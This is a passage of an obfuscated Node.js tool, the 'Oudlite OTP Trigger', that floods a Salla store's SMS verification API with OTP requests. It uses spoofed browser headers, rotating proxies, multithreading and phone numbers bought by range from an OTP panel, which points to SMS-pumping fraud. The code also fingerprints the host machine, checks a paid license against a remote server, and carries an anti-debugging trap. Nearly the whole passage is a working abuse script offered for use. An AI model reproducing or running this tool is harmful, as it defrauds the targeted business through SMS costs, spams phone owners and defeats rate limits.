  v108.ua = "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v108.mobile = '?1', v108.platform = "\"Android\"";
  const v109 = {};
  v109.ua = "Mozilla/5.0 (Linux; Android 14; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v109.mobile = '?1', v109.platform = "\"Android\"";
  const v110 = {};
  v110.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Safari/537.36", v110.mobile = '?0', v110.platform = "\"Windows\"";
  const v111 = {};
  v111.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Safari/537.36", v111.mobile = '?0', v111.platform = "\"Windows\"";
  const v112 = [v100, v101, v102, v103, v104, v105, v106, v107, v108, v109, v110, v111],
    v113 = v112[Math.floor(Math.random() * v112.length)],
    v114 = {};
  return v114.userAgent = v113.ua, v114.secChUa = v99, v114.secChUaMobile = v113.mobile, v114.secChUaPlatform = v113.platform, v114;
}
async function triggerOTP(v115, v116 = {}) {
  const {
    onStatus = () => {},
    proxy = null,
    timeout = 20000
  } = v116;
  const v117 = extractPhoneDetails(v115);
  const v118 = getRandomClient(),
    v119 = {
      'accept': "application/json, text/plain, */*",
      'accept-encoding': "gzip, deflate, br, zstd",
      'accept-language': 'ar',
      'content-type': "application/json",
      'currency': "SAR",
      'origin': "https://accounts.salla.com",
      'priority': "u=1, i",
      'referer': "https://accounts.salla.com/",
      's-anonymous-id': uuid(),
      's-app-os': "browser",
      's-app-version': "2.14.499",
      's-country': 'SA',
      's-origin': "https://sa.oudelite.com",
      's-ray': "100",
      's-render-key': "1.qYl0lrS9nkWVEm1-akd2nc2UZMeNF2L85ZE4epsNEjd5Rz3MhMO_zwsbediS6Nj2W2RNWJERN49LOuFb47PSTBKvp9CtM-obSA_hNq9ZnChFH6IfIi8z0l1ltsBEMb9ggyZoxc-MiSEoIhllpsBtswc9Mwee3bkOL11bybWS4KTmFHRp2CvlkcUEMxw5z4xQhff-zVJj3UBlxqg6baWoVKpiZTAuoLE5c4b6zFBRUg5HUPA4AAD2z3ZbYgrrlhWxyAgtWBPLFScPNjjS3T7Vaj0V8nk02Lic2xVh9OUMp91KnDGjHk3mq7zi9WMPgwiQwYCt4LZGf7HlDzy0Y4g1mgeXID-Mk4fciisHRDFDYZOU6z0stdUJUAUI8a_U0Gx9ZraS62XAneoTC6eRuHuRzGYf4pj6J-lxGEO6MsxyQWhOg_-aKMyQ_Vs-UlqgfIhaAbjY9c6GeiqJ55akuiAFfxRNv08cxAwY-wE0J_4Bo0QRUEtJTYyuH-LsIg7LM1nP3Eb5hooCq1tJqSJideCOn4IqTY4WlUJ61yTmNtHTRbyHdTKMLeLbmWI28ELnzUuxr-xeusbWAByydRRp7qk0OsQRv_UUual918-YKoIOTa7EgY0xJ5rsh6dGa7VyFxAihT0ftQnfHw_I3Tl_gba1jL__avupMieipEoqQ8bHHzQ.tyADD6KjaqPZhdG36iqjAA.d46442bcdc2adbd101dfda01db59860480f7e9205d3cbe90a49a8d5a62aeab7f",
      's-scope-id': "1373834269",
      's-scope-type': "scope",
      's-source': "account",
      's-user-id': crypto.randomBytes(30).toString("base64url").substring(0, 40),
      's-version-id': "1227521279",
      'sec-ch-ua': v118.secChUa,
      'sec-ch-ua-mobile': v118.secChUaMobile,
      'sec-ch-ua-platform': v118.secChUaPlatform,
      'sec-fetch-dest': "empty",
      'sec-fetch-mode': "cors",
      'sec-fetch-site': "cross-site",
      'store-identifier': "1934736234",
      'user-agent': v118.userAgent,
      'x-requested-with': "XMLHttpRequest"
    };
  try {
    {
      onStatus("[1/1] Sending OTP to " + v117.fullNumber + "...");
      const v120 = {};
      v120.type = "mobile", v120.phone = v117.localPhone, v120.country_code = v117.countryCode, v120.country_key = v117.countryKey;
      const v121 = JSON.stringify(v120),
        v122 = await sendRequest("https://api.salla.dev/store/v1/auth/mobile/send_verification", "POST", v119, v121, proxy, timeout);
      debugLog(v117.fullNumber, "otp-res", v122.data);
      const v123 = v122.data ? (() => {
        try {
          return JSON.parse(v122.data);
        } catch {
          return {};
        }
      })() : {};
      if (v122.status === 200 && (v123.success === true || v123.data && v123.data.verification && v123.data.verification.status === "pending")) {
        onStatus("[1/1] ✅ OTP Dispatched");
        const v124 = {};
        return v124.success = true, v124.message = "OTP Triggered", v124.phone = v117.fullNumber, v124;
      } else {
        if (v122.status === 429) {
          throw new Error("Rate Limited (429) — Too many requests");
        } else {
          {
            const v125 = v123.error?.["message"] || v123.message || "Failed (HTTP " + v122.status + ')';
            throw new Error('' + v125);
          }
        }
      }
    }
  } catch (v126) {
    {
      const v127 = {};
      return v127.success = false, v127.message = '' + v126.message, v127.phone = v117.fullNumber, v127;
    }
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v128) {
      {
        this.totalNumbers = v128;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v129, v130) {
      let v131 = '';
      if (v130 === "success") {
        v131 = chalk.hex("#D4AF37").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#D4AF37")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFFFFF").bold(v129.replace("Triggered OTP for ", ''));
      } else {
        if (v130 === "retry") {
          v131 = chalk.hex("#FFFFFF").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFFFFF")(v129);
        } else {
          {
            const v132 = v129.match(/\+?\d{7,}/),
              v133 = v132 ? v132[0] : '',
              v134 = v129.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
            v131 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v133 ? '' + v133 : '') + chalk.hex("#555555")(v133 ? " → " : '') + chalk.hex("#888888")(v134);
          }
        }
      }
      process.stdout.write("\r[K" + v131 + '\x0a'), this.render();
    }
    ["setStatus"](v135) {}
    ["update"]() {}
    ["render"]() {
      const v136 = this.processed / Math.max(this.totalNumbers, 1),
        v137 = (v136 * 100).toFixed(1),
        v138 = 20,
        v139 = Math.round(v136 * v138),
        v140 = v138 - v139,
        v141 = chalk.hex("#D4AF37")('█'.repeat(v139)) + chalk.hex("#333333")('░'.repeat(v140));
      const v142 = '\x20\x20' + chalk.hex("#D4AF37").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v141 + chalk.hex("#888888")('\x20' + v137 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#D4AF37").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v142);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v143 = Math.floor((Date.now() - this.startTime) / 1000),
        v144 = Math.floor(v143 / 60);
      const v145 = v143 % 60,
        v146 = v144 + 'm\x20' + v145 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  OUDLITE OTP TRIGGER — COMPLETE            ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣"));
      console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v146.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v147, v148) {
    return new Promise(v149 => {
      let v150 = 0;
      process.stdin.resume();
      readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn3 = () => {
        process.stdout.write("[2J[H"), printHeader(), console.log("   [33m" + v147 + "[0m\n"), v148.forEach((v151, v152) => {
          v152 === v150 ? console.log("   [36m➔[33m " + v151.name + "[0m") : console.log("     [90m" + v151.name + "[0m");
        });
      };
      fn3();
      const fn4 = (v153, v154) => {
        {
          if (v154.ctrl && v154.name === 'c') process.exit(0);
          if (v154.name === 'up') {
            v150 = (v150 - 1 + v148.length) % v148.length, fn3();
          } else {
            if (v154.name === "down") {
              v150 = (v150 + 1) % v148.length, fn3();
            } else v154.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn4), v149(v148[v150].value));
          }
        }
      };
      process.stdin.on("keypress", fn4);
    });
  }
  async function promptText(v155, v156) {
    return new Promise(v157 => {
      {
        process.stdout.write("   [33m" + v155 + "[0m ");
        let v158 = '';
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
        process.stdin.resume();
        const fn5 = v159 => {
          const v160 = v159.toString();
          if (v160.includes('\x0a') || v160.includes('\x0d')) {
            process.stdin.removeListener("data", fn5), v158 += v160.split(/[\r\n]/)[0];
            let v161 = v158.trim();
            if (v161.startsWith('\x22') && v161.endsWith('\x22')) v161 = v161.slice(1, -1);
            v157(v161 || v156);
          } else v158 += v160;
        };
        process.stdin.on("data", fn5);
      }
    });
  }
  async function interactiveWizard() {
    process.stdout.write("[2J[H"), printHeader(), console.log(W.bold("  --- REX OUDLITE AI  ---\n"));
    const v162 = await selectOption("SELECT NUMBER SOURCE", [{
      'name': "📁 Load from file (numbers.txt)",
      'value': "file"
    }, {
      'name': "🌐 Auto fetch from NexaOTP Panel",
      'value': "nexa"
    }]);
    let v163 = "numbers.txt",
      v164 = null;
    if (v162 === "nexa") {
      let v167 = '';
      const v168 = path.join(__dirname, ".nexa_api_key");
      if (fs.existsSync(v168)) {
        const v175 = fs.readFileSync(v168, "utf8").trim(),
          v176 = await selectOption("Found saved API Key (..." + v175.slice(-4) + "). Use it?", [{
            'name': "Yes, use saved key",
            'value': "yes"
          }, {
            'name': "No, enter new key",
            'value': 'no'
          }, {
            'name': "Delete saved key",
            'value': "delete"
          }]);
        if (v176 === "yes") v167 = v175;else v176 === "delete" && (fs.unlinkSync(v168), console.log(G("\n   ✗ Saved key deleted.\n")));
      }
      if (!v167) {
        v167 = await promptText("Enter NexaOTP API Key:", '');
        const v177 = {};
        v177.name = 'No', v177.value = 'no';
        const v178 = await selectOption("Save this key for future use?", [{
          'name': "Yes, save it",
          'value': "yes"
        }, v177]);
        v178 === "yes" && (fs.writeFileSync(v168, v167, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
      }
      let v169 = [],
        v170 = true;
      while (v170) {
        {
          const v179 = await promptText("Enter range #" + (v169.length + 1) + " (e.g. 21624485XXX):", '');
          if (v179) v169.push(v179);
          const v180 = await selectOption("Add another range?", [{
            'name': "Yes",
            'value': "yes"
          }, {
            'name': "No, proceed",
            'value': 'no'
          }]);
          if (v180 === 'no') v170 = false;
        }
      }
      v169.length === 0 && (console.log(R("\n   ✗ You must provide at least one range.\n")), process.exit(1));
      const v171 = await promptText("How many numbers to process? (e.g. 100):", '50'),
        v172 = parseInt(v171) || 50,
        v173 = await selectOption("SELECT NEXA SERVER", [{
          'name': "Server 1 (/get)",
          'value': "/api/v1/numbers/get"
        }, {
          'name': "Server 2 (/p2/get)",
          'value': "/api/v1/numbers/p2/get"
        }, {
          'name': "Server 3 (/p3/get)",
          'value': "/api/v1/numbers/p3/get"
        }]),
        v174 = {};
      v174.apiKey = v167, v174.ranges = v169, v174.totalCount = v172, v174.serverEndpoint = v173, v164 = v174;
    } else {
      {
        v163 = await promptText("Enter Numbers File Path [default: numbers.txt]:", "numbers.txt");
        if (!fs.existsSync(v163)) fs.writeFileSync(v163, '');
      }
    }
    let v165 = await promptText("Enter Proxies File Path (Leave blank for direct) [default: none]:", "none");
    if (v165 === "none" || v165 === '') v165 = '';
    let v166 = await selectOption("SELECT THREADS", [{
      'name': "10 Threads",
      'value': 0xa
    }, {
      'name': "20 Threads (Default)",
      'value': 0x14
    }, {
      'name': "50 Threads (Fast)",
      'value': 0x32
    }, {
      'name': "100 Threads (Extreme)",
      'value': 0x64
    }, {
      'name': "Custom Threads",
      'value': "custom"
    }]);
    if (v166 === "custom") {
      const v181 = await promptText("Enter custom number of threads (e.g. 500):", '20');
      v166 = parseInt(v181) || 20;
    }
    return process.stdin.pause(), {
      'numbersFile': v163,
      'threads': String(v166),
      'proxiesFile': v165,
      'nexaConfig': v164
    };
  }
  function generateHWID() {
    const v182 = require('os'),
      v183 = v182.platform();
    try {
      {
        if (v183 === "win32") {
          {
            const v184 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
              'stdio': "pipe",
              'timeout': 0x3a98
            }).toString().trim();
            if (!v184) throw new Error("No hardware data");
            const v185 = crypto.createHash("sha256").update(v184).digest("hex").toUpperCase();
            return "SKING-" + v185.substring(0, 8) + '-' + v185.substring(8, 12) + '-' + v185.substring(12, 16);
          }
        } else {
          {
            let v186 = [];
            try {
              {
                const v190 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
                  'stdio': "pipe",
                  'timeout': 0x1388
                }).toString().trim();
                if (v190 && v190 !== "null") v186.push('A:' + v190);
              }
            } catch (v191) {}
            try {
              if (fs.existsSync("/proc/cpuinfo")) {
                const v192 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                  v193 = v192.match(/Serial\s*:\s*(\S+)/i),
                  v194 = v192.match(/Hardware\s*:\s*(.+)/i);
                if (v193 && v193[1] !== "0000000000000000") v186.push('S:' + v193[1].trim());
                if (v194) v186.push('H:' + v194[1].trim());
              }
            } catch (v195) {}
            try {
              if (fs.existsSync("/etc/machine-id")) {
                const v196 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                if (v196) v186.push('M:' + v196);
              }
            } catch (v197) {}
            try {
              {
                const v198 = v182.cpus(),
                  v199 = v198 && v198.length > 0 ? v198[0].model : "UnknownCPU",
                  v200 = v182.totalmem(),
                  v201 = v182.release(),
                  v202 = v182.hostname();
                v186.push('F:' + v199 + '|' + v200 + '|' + v201 + '|' + v202);
              }
            } catch (v203) {}
            const v187 = v186.join('||'),
              v188 = crypto.createHash("sha256").update(v187).digest("hex").toUpperCase(),
              v189 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
            return v189 + v188.substring(0, 8) + '-' + v188.substring(8, 12) + '-' + v188.substring(12, 16);
          }
        }
      }
    } catch (v204) {
      return '';
    }
  }
  function verifyServerSignature(v205, v206) {
    if (!v206) return false;
    const v207 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v205, "utf8"), v207, Buffer.from(v206, "base64"));
    } catch (v208) {
      return false;
    }
  }
  async function start() {
    const v209 = generateHWID();
    if (!v209) {
      console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1);
    }
    const v210 = generateHWID();
    v210 !== v209 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Oudlite OTP Trigger          ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v209.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v211 = false,
      v212 = "Licensed";
    const v213 = Date.now();
    try {
      {
        const v233 = "188.137.176.163",
          v234 = require("http"),
          v235 = await new Promise((v236, v237) => {
            const v238 = {};
            v238.hwid = v209, v238.app_id = "oudlite", v238.version = "1.0.0", v238.timestamp = v213;
            const v239 = JSON.stringify(v238);
            const v240 = {
                'hostname': v233,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v239)
                },
                'timeout': 0x2710
              },
              v241 = v234.request(v240, v242 => {
                {
                  let v243 = '';
                  v242.on("data", v244 => v243 += v244), v242.on("end", () => {
                    try {
                      v236(JSON.parse(v243));
                    } catch (v245) {
                      v237(v245);
                    }
                  });
                }
              });
            v241.on("error", v237), v241.on("timeout", function () {
              this.destroy();
              v237(new Error("Timeout"));
            }), v241.write(v239);
            v241.end();
          });
        if (v235) {
          {
            v235.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
            if (v235.status === "banned" || v235.status === "expired" || !v235.sig) {
              {
                await new Promise(v249 => setTimeout(v249, 2000));
                let v248 = String(v235.reason || "NOT REGISTERED");
                if (!v235.reason && !v235.sig) v248 = "NOT REGISTERED / REMOVED";
                console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — OUDLITE TOOL   ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v209.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v248.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
              }
            }
            const v246 = v209 + "|oudlite|1.0.0|" + v213;
            !verifyServerSignature(v246, v235.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
            v211 = true;
            let v247 = v235.token;
            !v247 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
              {
                if (!v247) {
                  console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1);
                }
                const v250 = {};
                v250.hwid = v209, v250.app_id = "oudlite", v250.token = v247;
                const v251 = JSON.stringify(v250),
                  v252 = {
                    'hostname': v233,
                    'port': 0xec1,
                    'path': "/api/ping",
                    'method': "POST",
                    'headers': {
                      'Content-Type': "application/json",
                      'Content-Length': Buffer.byteLength(v251)
                    },
                    'timeout': 0x1388
                  },
                  v253 = v234.request(v252, v254 => {
                    {
                      let v255 = '';
                      v254.on("data", v256 => v255 += v256), v254.on("end", () => {
                        try {
                          {
                            const v257 = JSON.parse(v255);
                            if (v257.status === 'ok' && v257.token) v247 = v257.token;else {
                              console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1);
                            }
                          }
                        } catch (v258) {
                          console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                        }
                      });
                    }
                  });
                v253.on("error", () => {
                  console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
                  process.exit(1);
                }), v253.on("timeout", function () {
                  this.destroy(), console.error(R("\n  ✗ License Server timeout. Exiting...\n")), process.exit(1);
                }), v253.write(v251), v253.end();
              }
            }, 45000);
          }
        }
      }
    } catch (v259) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v211 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v214 = process.argv.slice(2),
      v215 = null;
    if (v214.length === 0) {
      const v260 = await interactiveWizard();
      v214 = [v260.numbersFile, v260.threads, v260.proxiesFile], v215 = v260.nexaConfig;
    }
    let v216 = path.resolve(v214[0] || "numbers.txt"),
      v217 = parseInt(v214[1]) || 20,
      v218 = v214[2] !== undefined ? v214[2] : "proxies.txt";
    if (v218.toLowerCase() === "none") v218 = '';
    const v219 = generateHWID();
    v219 !== v209 && (console.error(R("\n  ✗ CRITICAL SECURITY ALERT: Runtime memory injection detected.")), console.error(R("  ✗ HWID mismatch during execution sequence. Aborting...\n")), process.exit(1));
    printHeader(), console.log(B("  ✓ License: " + v212) + G(" | HWID: " + v209));
    let v220 = [];
    !v215 && (!fs.existsSync(v216) && (console.error(R("✗ Error: Numbers file not found: " + v216)), process.exit(1)), v220 = fs.readFileSync(v216, "utf8").split(/\r?\n/).map(v261 => v261.trim()).filter(v262 => v262.length > 5));
    let v221 = [];
    v218 && fs.existsSync(v218) && (v221 = fs.readFileSync(v218, "utf8").split('\x0a').map(v263 => v263.trim()).filter(v264 => v264.length > 0));
    let v222 = v221.map(parseProxy).filter(Boolean);
    v215 ? console.log(C("✓ Target  : NexaOTP API (" + v215.totalCount + " numbers)")) : console.log(C("✓ Loaded " + v220.length + " targets"));
    if (v222.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v222.length));
    console.log(C("✓ Threads : " + v217 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, '');
    fs.writeFileSync(DEBUG_FILE, "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v223 = new Dashboard(v215 ? v215.totalCount : v220.length);
    let v224 = [],
      v225 = [],
      v226 = 0,
      v227 = false;
    v215 && (async () => {
      try {
        for (let v265 = 0; v265 < v215.totalCount; v265++) {
          try {
            const v266 = v215.ranges[Math.floor(Math.random() * v215.ranges.length)],
              v267 = await nexaLimiter.enqueue(() => nexaFetchNumber(v215.apiKey, v266, v215.serverEndpoint));
            v267 && (v226++, v225.length > 0 ? v225.shift()(v267) : v224.push(v267));
          } catch (v268) {
            {
              if (v268.message.includes("Insufficient balance") || v268.message.includes("No numbers available")) {
                break;
              }
            }
          }
        }
      } finally {
        v227 = true;
        while (v225.length > 0) v225.shift()(null);
      }
    })();
    const v228 = v215 ? () => {
      if (v224.length > 0) return Promise.resolve(v224.shift());
      if (v227) return Promise.resolve(null);
      return new Promise(v269 => v225.push(v269));
    } : () => {
      {
        if (v220.length === 0) return Promise.resolve(null);
        const v270 = Math.floor(Math.random() * v220.length);
        return Promise.resolve(v220.splice(v270, 1)[0]);
      }
    };
    let v229 = 0;
    const fn6 = () => {
      {
        if (v222.length === 0) return null;
        const v271 = v222[v229];
        return v229 = (v229 + 1) % v222.length, rotateSessionId(v271);
      }
    };
    function fn7(v272) {
      try {
        {
          const v273 = fs.readFileSync(v216, "utf8"),
            v274 = v273.split(/\r?\n/).filter(v275 => v275.trim() !== v272.trim()).join('\x0a');
          fs.writeFileSync(v216, v274);
        }
      } catch (v276) {}
    }
    const v230 = v215 ? Math.min(v217, v215.totalCount) : Math.min(v217, v220.length),
      v231 = [],
      v232 = setInterval(() => v223.render(), 500);
    async function fn8(v277) {
      while (true) {
        const v278 = await v228();
        if (!v278) break;
        try {
          {
            const v279 = await triggerOTP(v278, {
              'onStatus': v280 => v223.setStatus("Worker " + v277 + ':\x20' + v280),
              'proxy': fn6(),
              'workerId': v277
            });
            if (v279.success) {
              {
                v223.successful++;
                v223.processed++;
                fn7(v278);
                fs.appendFileSync(SUCCESSFUL_FILE, v279.phone + "|OTP_SENT\n");
                v223.addLog("Triggered OTP for " + v279.phone, "success");
              }
            } else {
              if (v279.message.toLowerCase().includes("throttled") || v279.message.toLowerCase().includes("rate limited")) {
                {
                  {
                    v223.failed++;
                    v223.processed++;
                    fn7(v278);
                    fs.appendFileSync(FAILED_FILE, v279.phone + '|' + v279.message + '\x0a');
                    v223.addLog("Failed on " + v279.phone + ": Number already used (Throttled)", "error");
                  }
                }
              } else {
                if (v279.message.toLowerCase().includes("captcha") || v279.message.includes("timeout") || v279.message.includes("Proxy")) {
                  {
                    if (v215) {
                      v224.push(v278);
                    } else v220.push(v278);
                    let v281 = v279.message.includes("Captcha") ? "Captcha IP" : "Proxy Error";
                    v223.addLog("Retrying " + v278 + '\x20(' + v281 + ')', "retry");
                  }
                } else {
                  {
                    v223.failed++;
                    v223.processed++;
                    fn7(v278);
                    fs.appendFileSync(FAILED_FILE, v279.phone + '|' + v279.message + '\x0a');
                    v223.addLog("Failed on " + v279.phone + ':\x20' + v279.message, "error");
                  }
                }
              }
            }
          }
        } catch (v282) {
          v223.failed++, v223.processed++, v223.addLog("Fatal error on " + v278 + ':\x20' + v282.message, "error");
        }
      }
    }
    for (let v283 = 0; v283 < v230; v283++) v231.push(fn8(v283));
    await Promise.all(v231), clearInterval(v232), v223.render(), v223.stop();
  }
  start()["catch"](v284 => {
    console.error(R("Fatal error: " + v284.message));
    process.exit(1);
  });
}
function fn2(v285) {
  function fn9(v286) {
    fn9(++v286);
  }
  try {
    if (v285) {
      return fn9;
    } else {
      fn9(0);
    }
  } catch (v287) {}
}